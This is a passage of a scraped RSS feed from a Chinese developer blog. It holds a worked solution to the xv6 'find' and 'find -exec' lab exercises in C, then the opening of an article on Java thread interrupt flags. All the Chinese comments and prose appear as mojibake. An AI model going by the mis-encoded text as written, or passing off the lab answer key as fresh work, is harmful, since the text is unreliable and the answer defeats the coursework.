    <span class="hljs-comment">// æ‰“å¼€è·¯å¾„</span>
    <span class="hljs-keyword">if</span> ((fd = open(path, O_RDONLY)) &lt; <span class="hljs-number">0</span>) {
        <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"find: cannot open %s\n"</span>, path);
        <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// è·å–æ–‡ä»¶çŠ¶æ€</span>
    <span class="hljs-keyword">if</span> (fstat(fd, &amp;st) &lt; <span class="hljs-number">0</span>) {
        <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"find: cannot stat %s\n"</span>, path);
        close(fd);
        <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-keyword">switch</span> (st.type) {
        <span class="hljs-keyword">case</span> T_FILE:
            <span class="hljs-comment">// å¦‚æœæ˜¯æ–‡ä»¶ï¼Œæ£€æŸ¥æ–‡ä»¶åæ˜¯å¦åŒ¹é…</span>
            <span class="hljs-comment">// fmtname(path) è·å–å½“å‰è·¯å¾„çš„æ–‡ä»¶åéƒ¨åˆ†</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(fmtname(path), target) == <span class="hljs-number">0</span>) {
                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s\n"</span>, path);
            }
            <span class="hljs-keyword">break</span>;

        <span class="hljs-keyword">case</span> T_DIR:
            <span class="hljs-comment">// å¦‚æœæ˜¯ç›®å½•ï¼Œæ£€æŸ¥è·¯å¾„é•¿åº¦æ˜¯å¦æº¢å‡ºç¼“å†²åŒº</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(path) + <span class="hljs-number">1</span> + DIRSIZ + <span class="hljs-number">1</span> &gt; <span class="hljs-keyword">sizeof</span> buf) {
                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"find: path too long\n"</span>);
                <span class="hljs-keyword">break</span>;
            }
            <span class="hljs-comment">// æ„é€ å½“å‰ç›®å½•çš„è·¯å¾„å‰ç¼€ï¼Œä¾‹å¦‚ "a/"</span>
            <span class="hljs-built_in">strcpy</span>(buf, path);
            p = buf + <span class="hljs-built_in">strlen</span>(buf);
            *p++ = <span class="hljs-string">'/'</span>;

            <span class="hljs-comment">// å¾ªç¯è¯»å–ç›®å½•é¡¹</span>
            <span class="hljs-keyword">while</span> (read(fd, &amp;de, <span class="hljs-keyword">sizeof</span>(de)) == <span class="hljs-keyword">sizeof</span>(de)) {
                <span class="hljs-keyword">if</span> (de.inum == <span class="hljs-number">0</span>) <span class="hljs-keyword">continue</span>;

                <span class="hljs-comment">// ã€å…³é”®ã€‘å¿…é¡»è·³è¿‡ "." å’Œ ".."ï¼Œå¦åˆ™ä¼šæ— é™é€’å½’</span>
                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(de.name, <span class="hljs-string">"."</span>) == <span class="hljs-number">0</span> || <span class="hljs-built_in">strcmp</span>(de.name, <span class="hljs-string">".."</span>) == <span class="hljs-number">0</span>)
                    <span class="hljs-keyword">continue</span>;

                <span class="hljs-comment">// å°†ç›®å½•é¡¹åç§°æ‹¼æ¥åˆ°è·¯å¾„åï¼Œä¾‹å¦‚ "a/b"</span>
                memmove(p, de.name, DIRSIZ);
                p[DIRSIZ] = <span class="hljs-number">0</span>;  <span class="hljs-comment">// ç¡®ä¿å­—ç¬¦ä¸²ä»¥ null ç»“å°¾</span>

                <span class="hljs-comment">// é€’å½’è°ƒç”¨ find</span>
                find(buf, target);
            }
            <span class="hljs-keyword">break</span>;
    }
    close(fd);
}

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span> {
    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>) {
        <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"Usage: find &lt;path&gt; &lt;name&gt;\n"</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
    <span class="hljs-comment">// è°ƒç”¨ find å‡½æ•°ï¼Œä¼ å…¥è·¯å¾„å’Œç›®æ ‡æ–‡ä»¶å</span>
    find(argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>]);
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
}
</code></pre>
<h3 data-id="heading-10">exec (moderate)</h3>
<p>è¿™ä¸ªç»ƒä¹ æ¶‰åŠç³»ç»Ÿè°ƒç”¨ forkã€exec å’Œ waitã€‚</p>
<p>å‘ <code>find</code> æ·»åŠ ä¸€ä¸ª "-exec <em>cmd</em>"ï¼Œå®ƒå°†é’ˆå¯¹ <code>find</code> æ‰¾åˆ°çš„æ¯ä¸ªæ–‡ä»¶ <em>f</em> æ‰§è¡Œç¨‹åº " <code>cmd file</code> "ï¼Œè€Œä¸æ˜¯æ‰“å°åŒ¹é…çš„æ–‡ä»¶åã€‚</p>
<p>ä»¥ä¸‹ç¤ºä¾‹è¯´æ˜ find -exec è¡Œä¸ºï¼š æ³¨æ„è¿™é‡Œçš„å‘½ä»¤æ˜¯"echo hi"å’Œæ–‡ä»¶ æ˜¯ "./wc"ï¼Œä½¿å¾—å‘½ä»¤ä¸º "echo hi ./wc"ï¼Œ å®ƒè¾“å‡º "hi ./wc"ã€‚</p>
<p>ä¸€äº›æç¤ºï¼š</p>
<ul>
<li>ä½¿ç”¨ <code>fork</code> å’Œ <code>exec</code> åœ¨æ¯ä¸ªæ–‡ä»¶ä¸Šè°ƒç”¨å‘½ä»¤ã€‚åœ¨çˆ¶çº§ä½¿ç”¨ <code>wait</code> ç­‰å¾…å­©å­å®ŒæˆæŒ‡ä»¤ã€‚</li>
<li>kernel/param.h å£°æ˜äº† MAXARGï¼Œå¦‚æœä½ éœ€è¦å£°æ˜ä¸€ä¸ª argv æ•°ç»„ï¼Œè¿™å¯èƒ½å¾ˆæœ‰ç”¨ã€‚</li>
</ul>
<p>è¦æµ‹è¯•ä½ çš„ find è§£å†³æ–¹æ¡ˆï¼Œè¯·è¿è¡Œ shell è„šæœ¬ findtest.shã€‚ä½ çš„è§£å†³æ–¹æ¡ˆåº”è¯¥äº§ç”Ÿä»¥ä¸‹è¾“å‡ºï¼š</p>
<pre><code class="hljs language-ruby" lang="ruby">  <span class="hljs-variable">$ </span>make qemu
  ...
  <span class="hljs-symbol">init:</span> starting sh
  <span class="hljs-variable">$ </span>sh &lt; findtest.sh
<span class="hljs-variable">$ </span>echo <span class="hljs-variable constant_">DONE</span>
<span class="hljs-variable">$ </span><span class="hljs-variable">$ </span><span class="hljs-variable">$ </span><span class="hljs-variable">$ </span><span class="hljs-variable">$ </span>hello
hello
hello
<span class="hljs-variable">$ </span><span class="hljs-variable">$
</span>  
</code></pre>
<p>è¾“å‡ºä¸­æœ‰ å¾ˆå¤š <code>$</code> ï¼Œå› ä¸º xv6 shell æ„Ÿè§‰å®ƒæ­£åœ¨å¤„ç†æ¥è‡ªæ–‡ä»¶çš„å‘½ä»¤è€Œä¸æ˜¯æ¥è‡ªæ§åˆ¶å°ï¼Œå¹¶ä¸”ä¸ºæ–‡ä»¶ä¸­çš„æ¯ä¸ªå‘½ä»¤æ‰“å°ä¸€ä¸ª <code>$</code> ã€‚</p>
<h4 data-id="heading-11">My Solution:</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"kernel/types.h"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"kernel/stat.h"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"user/user.h"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"kernel/fs.h"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"kernel/fcntl.h"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"kernel/param.h"</span>  <span class="hljs-comment">// æä¾› MAXARG å®šä¹‰</span></span>

<span class="hljs-comment">// è·å–è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†</span>
<span class="hljs-type">char</span>*
<span class="hljs-title function_">fmtname</span><span class="hljs-params">(<span class="hljs-type">char</span> *path)</span>
{
  <span class="hljs-type">char</span> *p;
  <span class="hljs-keyword">for</span>(p=path+<span class="hljs-built_in">strlen</span>(path); p &gt;= path &amp;&amp; *p != <span class="hljs-string">'/'</span>; p--)
    ;
  p++;
  <span class="hljs-keyword">return</span> p;
}

<span class="hljs-comment">// è¿è¡Œ exec å‘½ä»¤</span>
<span class="hljs-comment">// cmd_argv: ç”¨æˆ·åœ¨å‘½ä»¤è¡Œæä¾›çš„å‘½ä»¤å‚æ•° (ä¾‹å¦‚ {"echo", "hi"})</span>
<span class="hljs-comment">// cmd_argc: å‘½ä»¤å‚æ•°çš„ä¸ªæ•°</span>
<span class="hljs-comment">// file_path: å½“å‰æ‰¾åˆ°çš„æ–‡ä»¶è·¯å¾„ (ä¾‹å¦‚ "./a/b")</span>
<span class="hljs-type">void</span>
<span class="hljs-title function_">run_exec</span><span class="hljs-params">(<span class="hljs-type">char</span> **cmd_argv, <span class="hljs-type">int</span> cmd_argc, <span class="hljs-type">char</span> *file_path)</span>
{
  <span class="hljs-type">char</span> *argv[MAXARG];
  <span class="hljs-type">int</span> i;

  <span class="hljs-comment">// 1. æ£€æŸ¥å‚æ•°æ•°é‡æ˜¯å¦æº¢å‡º</span>
  <span class="hljs-comment">// éœ€è¦ cmd_argc ä¸ªåŸå‚æ•° + 1 ä¸ªæ–‡ä»¶è·¯å¾„ + 1 ä¸ª NULL ç»“æŸç¬¦</span>
  <span class="hljs-keyword">if</span>(cmd_argc + <span class="hljs-number">2</span> &gt; MAXARG){
    <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"find: too many arguments for exec\n"</span>);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-comment">// 2. æ„é€ æ–°çš„ argv æ•°ç»„</span>
  <span class="hljs-comment">// å¤åˆ¶åŸæœ¬çš„å‘½ä»¤å‚æ•°</span>
  <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; cmd_argc; i++){
    argv[i] = cmd_argv[i];
  }
  <span class="hljs-comment">// è¿½åŠ å½“å‰æ–‡ä»¶è·¯å¾„</span>
  argv[i] = file_path;
  <span class="hljs-comment">// è¿½åŠ  NULL ç»“æŸç¬¦</span>
  argv[i+<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;

  <span class="hljs-comment">// 3. Fork å’Œ Exec</span>
  <span class="hljs-type">int</span> pid = fork();
  <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>){
    <span class="hljs-comment">// å­è¿›ç¨‹</span>
    exec(argv[<span class="hljs-number">0</span>], argv);
    <span class="hljs-comment">// å¦‚æœ exec è¿”å›ï¼Œè¯´æ˜å‡ºé”™äº†</span>
    <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"find: exec %s failed\n"</span>, argv[<span class="hljs-number">0</span>]);
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid &gt; <span class="hljs-number">0</span>){
    <span class="hljs-comment">// çˆ¶è¿›ç¨‹ç­‰å¾…å­è¿›ç¨‹ç»“æŸ</span>
    wait(<span class="hljs-number">0</span>);
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"find: fork failed\n"</span>);
  }
}

<span class="hljs-comment">// æŸ¥æ‰¾å‡½æ•°</span>
<span class="hljs-comment">// path: å½“å‰æœç´¢è·¯å¾„</span>
<span class="hljs-comment">// target: ç›®æ ‡æ–‡ä»¶å</span>
<span class="hljs-comment">// exec_argv: å¦‚æœéç©ºï¼Œåˆ™æŒ‡å‘ -exec åçš„å‘½ä»¤å‚æ•°æ•°ç»„</span>
<span class="hljs-comment">// exec_argc: å‘½ä»¤å‚æ•°ä¸ªæ•°</span>
<span class="hljs-type">void</span>
<span class="hljs-title function_">find</span><span class="hljs-params">(<span class="hljs-type">char</span> *path, <span class="hljs-type">char</span> *target, <span class="hljs-type">char</span> **exec_argv, <span class="hljs-type">int</span> exec_argc)</span>
{
  <span class="hljs-type">char</span> buf[<span class="hljs-number">512</span>], *p;
  <span class="hljs-type">int</span> fd;
  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dirent</span> <span class="hljs-title">de</span>;</span>
  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span>

  <span class="hljs-keyword">if</span>((fd = open(path, O_RDONLY)) &lt; <span class="hljs-number">0</span>){
    <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"find: cannot open %s\n"</span>, path);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-keyword">if</span>(fstat(fd, &amp;st) &lt; <span class="hljs-number">0</span>){
    <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"find: cannot stat %s\n"</span>, path);
    close(fd);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦åŒ¹é…</span>
  <span class="hljs-comment">// é€»è¾‘ï¼šå¦‚æœæ˜¯æ–‡ä»¶ï¼Œä¸”åå­—åŒ¹é… targetï¼Œåˆ™å¤„ç†</span>
  <span class="hljs-comment">// æ³¨æ„ï¼šæ ‡å‡† find ä¼šåœ¨ç›®å½•åŒ¹é…æ—¶ä¹Ÿæ‰§è¡Œï¼Œä½†æ ¹æ®é¢˜ç›®è¾“å‡ºç¤ºä¾‹ï¼Œ</span>
  <span class="hljs-comment">// ä¸»è¦æ˜¯é’ˆå¯¹æ‰¾åˆ°çš„ target æ‰§è¡Œã€‚è¿™é‡Œæˆ‘ä»¬ä¿æŒæ–‡ä»¶åçš„åŒ¹é…é€»è¾‘ã€‚</span>
  <span class="hljs-keyword">if</span>(st.type == T_FILE &amp;&amp; <span class="hljs-built_in">strcmp</span>(fmtname(path), target) == <span class="hljs-number">0</span>){
    <span class="hljs-keyword">if</span>(exec_argv != <span class="hljs-number">0</span>){
      <span class="hljs-comment">// å¦‚æœæœ‰ -exec é€‰é¡¹ï¼Œæ‰§è¡Œå‘½ä»¤</span>
      run_exec(exec_argv, exec_argc, path);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// å¦åˆ™ï¼Œæ‰“å°è·¯å¾„</span>
      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s\n"</span>, path);
    }
  }

  <span class="hljs-comment">// å¦‚æœæ˜¯ç›®å½•ï¼Œåˆ™é€’å½’</span>
  <span class="hljs-keyword">if</span>(st.type == T_DIR){
    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(path) + <span class="hljs-number">1</span> + DIRSIZ + <span class="hljs-number">1</span> &gt; <span class="hljs-keyword">sizeof</span> buf){
      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"find: path too long\n"</span>);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-built_in">strcpy</span>(buf, path);
      p = buf+<span class="hljs-built_in">strlen</span>(buf);
      *p++ = <span class="hljs-string">'/'</span>;
      
      <span class="hljs-keyword">while</span>(read(fd, &amp;de, <span class="hljs-keyword">sizeof</span>(de)) == <span class="hljs-keyword">sizeof</span>(de)){
        <span class="hljs-keyword">if</span>(de.inum == <span class="hljs-number">0</span>)
          <span class="hljs-keyword">continue</span>;
        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(de.name, <span class="hljs-string">"."</span>) == <span class="hljs-number">0</span> || <span class="hljs-built_in">strcmp</span>(de.name, <span class="hljs-string">".."</span>) == <span class="hljs-number">0</span>)
          <span class="hljs-keyword">continue</span>;
        
        memmove(p, de.name, DIRSIZ);
        p[DIRSIZ] = <span class="hljs-number">0</span>;
        
        <span class="hljs-comment">// é€’å½’è°ƒç”¨ï¼Œä¼ é€’ exec å‚æ•°</span>
        find(buf, target, exec_argv, exec_argc);
      }
    }
  }
  close(fd);
}

<span class="hljs-type">int</span>
<span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span>
{
  <span class="hljs-keyword">if</span>(argc &lt; <span class="hljs-number">3</span>){
    <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"Usage: find &lt;path&gt; &lt;name&gt; [-exec &lt;cmd&gt;...]\n"</span>);
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
  }

  <span class="hljs-type">char</span> *path = argv[<span class="hljs-number">1</span>];
  <span class="hljs-type">char</span> *target = argv[<span class="hljs-number">2</span>];
  <span class="hljs-type">char</span> **exec_argv = <span class="hljs-number">0</span>;
  <span class="hljs-type">int</span> exec_argc = <span class="hljs-number">0</span>;

  <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æœ‰ -exec å‚æ•°</span>
  <span class="hljs-keyword">if</span>(argc &gt; <span class="hljs-number">3</span>){
    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">3</span>], <span class="hljs-string">"-exec"</span>) == <span class="hljs-number">0</span>){
      <span class="hljs-comment">// argv[4] å¼€å§‹æ˜¯å‘½ä»¤ï¼Œä¾‹å¦‚ {"echo", "hi"}</span>
      exec_argv = &amp;argv[<span class="hljs-number">4</span>];
      exec_argc = argc - <span class="hljs-number">4</span>; <span class="hljs-comment">// è®¡ç®—å‘½ä»¤å‚æ•°ä¸ªæ•°</span>
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"find: syntax error, expected -exec\n"</span>);
      <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
  }

  find(path, target, exec_argv, exec_argc);
  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä½ çœŸçš„æ‡‚Thread.currentThread().interrupt()å—ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7589962224795910182</link>    <guid>https://juejin.cn/post/7589962224795910182</guid>    <pubDate>2026-01-02T07:55:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589962224795910182" data-draft-id="7587392473851707438" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä½ çœŸçš„æ‡‚Thread.currentThread().interrupt()å—ï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯,æ¶æ„,Java"/> <meta itemprop="datePublished" content="2026-01-02T07:55:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æƒ³ç”¨offeræ‰“ç‰Œ"/> <meta itemprop="url" content="https://juejin.cn/user/578781641968972"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä½ çœŸçš„æ‡‚Thread.currentThread().interrupt()å—ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/578781641968972/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æƒ³ç”¨offeræ‰“ç‰Œ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T07:55:43.000Z" title="Fri Jan 02 2026 07:55:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.8;font-weight:400;font-size:16px;word-spacing:2px;letter-spacing:2px;overflow-x:hidden;color:#3e3e3e;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{padding-bottom:12px;font-size:24px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:1.2em;border-bottom:2px solid #ef7060;word-spacing:0!important;letter-spacing:0!important;font-size:inherit;line-height:inherit;display:block;font-weight:400;background:#ef7060;color:#fff;padding:10px;border-top-right-radius:3px;border-top-left-radius:3px;margin-right:3px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="monokai">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#272822;color:#ddd}.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-strong,.hljs-tag{color:#f92672}.hljs-code{color:#66d9ef}.hljs-class .hljs-title{color:#fff}.hljs-attribute,.hljs-link,.hljs-regexp,.hljs-symbol{color:#bf79db}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-emphasis,.hljs-section,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-string,.hljs-subst,.hljs-template-tag,.hljs-template-variable,.hljs-title,.hljs-type,.hljs-variable{color:#a6e22e}.hljs-comment,.hljs-deletion,.hljs-meta,.hljs-quote{color:#75715e}.hljs-doctag,.hljs-keyword,.hljs-literal,.hljs-section,.hljs-selector-id,.hljs-selector-tag,.hljs-title,.hljs-type{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€</h2>
<p>åœ¨å¾ˆå¤šå¼€æºä»£ç ä¸­éƒ½ä¼šçœ‹åˆ°<code>Thread.currentThread().interrupt()</code>è¿™ä¸²ä»£ç ï¼Œå¯æ˜¯ä½ çœŸçš„äº†è§£å®ƒæœ‰ä»€ä¹ˆç”¨å¤„å—ï¼Ÿä»Šå¤©æˆ‘ä»¬å°±ä¸€èµ·æ¥çœ‹çœ‹è¿™ä¸²ä»£ç åˆ°åº•æ˜¯å¹²å˜›çš„ã€‚</p>
<p>ä»¥ä¸‹è¿™ä¸²ä»£ç æ˜¯Spring AI Alibabaçš„<code>ModelRetryInterceptor</code>ç±»çš„ç‰‡æ®µã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">try</span> {
    log.info(<span class="hljs-string">"Retry after {} ms"</span>, currentDelay);
    Thread.sleep(currentDelay);
} <span class="hljs-keyword">catch</span> (InterruptedException e) {
    Thread.currentThread().interrupt();
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"Retry interrupted"</span>, e);
}
</code></pre>
<h2 data-id="heading-1">æ¶ˆå¤±çš„ä¿¡å· -- çº¿ç¨‹çš„ä¸­æ–­æ ‡è®°ä½</h2>
<p>è¦ç†è§£è¿™ä¸ªé—®é¢˜ï¼Œé¦–å…ˆè¦æ˜ç™½ Java çš„ä¸­æ–­ï¼ˆInterruptionï¼‰æ˜¯ä¸€ç§<strong>åä½œæœºåˆ¶</strong>ï¼Œè€Œä¸æ˜¯å¼ºåˆ¶å‘½ä»¤ã€‚å®ƒä¾èµ–äºçº¿ç¨‹å¯¹è±¡å†…éƒ¨çš„ä¸€ä¸ªå¸ƒå°”æ ‡è®°ä½ï¼ˆInterrupt Statusï¼‰ã€‚</p>
<p>å½“æˆ‘ä»¬è°ƒç”¨ <code>t.interrupt()</code> æ—¶ï¼Œä»…ä»…æ˜¯æŠŠè¿™ä¸ªæ ‡è®°ä½è®¾ä¸º <code>true</code>ã€‚</p>
<p>ç„¶è€Œï¼ŒJava çš„é˜»å¡åº“å‡½æ•°ï¼ˆå¦‚ <code>Thread.sleep()</code>, <code>Object.wait()</code>, <code>BlockingQueue.take()</code>ï¼‰å¯¹ä¸­æ–­éå¸¸æ•æ„Ÿã€‚å®ƒä»¬çš„å¤„ç†é€»è¾‘é€šå¸¸åŒ…å«ä»¥ä¸‹ä¸¤ä¸ªåŸå­æ­¥éª¤ï¼š</p>
<ol>
<li><strong>æ£€æµ‹åˆ°ä¸­æ–­ä¿¡å·</strong>ï¼šå‘ç°ä¸­æ–­æ ‡è®°ä½ä¸º <code>true</code>ã€‚</li>
<li><strong>æ¸…é™¤æ ‡è®°å¹¶æŠ›å‡ºå¼‚å¸¸</strong>ï¼šä¸ºäº†å“åº”è¿™ä¸ªä¸­æ–­ï¼Œå®ƒä»¬ä¼š<strong>å…ˆå°†æ ‡è®°ä½é‡ç½®ä¸º false</strong>ï¼Œç„¶åæŠ›å‡º <code>InterruptedException</code>ã€‚</li>
</ol>
<p><strong>è¿™å°±æ˜¯é—®é¢˜çš„æ ¸å¿ƒï¼š</strong> å½“ä½ æ•è·åˆ° <code>InterruptedException</code> æ—¶ï¼Œçº¿ç¨‹çš„ä¸­æ–­æ ‡è®°ä½å·²ç»è¢« JVM è‡ªåŠ¨â€œåƒæ‰â€äº†ï¼ˆé‡ç½®ä¸º <code>false</code>ï¼‰ã€‚</p>
